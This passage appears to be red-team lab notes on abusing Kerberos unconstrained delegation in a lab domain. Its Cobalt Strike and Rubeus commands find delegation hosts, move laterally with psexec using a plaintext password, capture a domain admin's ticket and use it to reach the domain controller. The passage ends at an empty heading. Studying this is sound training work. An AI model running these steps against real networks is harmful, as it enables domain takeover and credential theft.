
### Unconstrained Delegation
- Use LDAP to find computers configured for unconstrained delegation.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb

-  Run Rubeus in monitor mode on _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap`
    
-  Wait 1-2 minutes for the TGT of a domain administrator to be captured.
    
-  Stop Rubeus.
    
    1. jobs
    2. jobkill 0

-  Inject the captured TGT into a sacrificial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET]`
    
-  Impersonate the spawned process.
    
    1. steal_token [PID]
-  Verify the ticket is present.
    
    1. run klist
-  Use it to access _lon-dc-1_.
    
    1. ls \\lon-dc-1\c$
-  Drop the impersonation.
    
    1. rev2self
-  Terminate the spawned process.
    
    1. kill [PID]

### Constrained Delegation
